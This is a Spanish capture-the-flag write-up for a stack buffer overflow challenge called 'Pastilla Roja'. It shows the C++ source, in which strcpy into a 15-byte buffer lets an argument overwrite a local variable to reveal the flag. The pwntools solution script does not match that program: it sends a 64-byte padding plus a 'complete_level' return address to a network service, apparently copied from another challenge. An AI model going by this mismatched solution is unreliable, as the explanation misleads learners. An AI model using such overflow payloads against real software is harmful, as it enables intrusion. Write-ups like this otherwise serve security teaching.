# Pastilla Roja
## Description
Decidir entre la pastilla azul o la pastilla roja es una decisión complicada. Pero ahora... ya hemos tomado una decisión. Intenta conseguir la pastilla roja.

Archivos:
- `redpill`

## Solution
El código original es:

```c++
#include <iostream>
#include <cstring> 
using namespace std;

int main(int argc, char **argv)
{
	cout << " Take the Red Pill!! \n" << endl;
	
	int pill;
	char buffer[15];
	if(argc == 1) {
		cout << " use: " << argv[0] <<" PILL " << endl;
		return 0;
	}
	
	pill = 0xb103743;
	strcpy(buffer, argv[1]);
	
	printf("     Red Pill  0x60334772\n");	
	printf("     Your Pill 0x%08x\n", pill);
	
	if(pill == 0x60334772) {
		printf("\n  Red Pill\n");
		char p2[] = "b0t";
		char p1[] = "t4k";
		cout << "  LetsCTF{" << p1 << "e-" << p2 << "h_"<< std::to_string(pill) << "} " << endl;
	}
	else {
		printf("\n  Blue Pill\n");
	}
}
```

Podemos resolver el reto con el siguiente script:

```python
from pwn import *

# Dirección IP y puerto del servidor
host = '127.0.0.1'
port = 40000

io = remote(host, port)

# Dirección de la función complete_level en formato little endian
complete_level_address = p32(0x08049196)

# Crear el payload
payload = b'A' * 64  # Llenar el buffer
payload += complete_level_address  # Sobrescribir el puntero de retorno con la dirección de complete_level

# Establecer conexión con el servidor utilizando pwntools y enviar el payload
io.sendline(payload)

# Leer y mostrar la salida hasta que se encuentre el mensaje "calling function pointer"
output = io.recvuntil(b"calling function pointer")

# Leer y mostrar la salida restante
output = io.recvall().decode(errors='replace')
print(f"calling function pointer{output}")
```

## Flag
LetsCTF{t4ke-b0th_1613973362}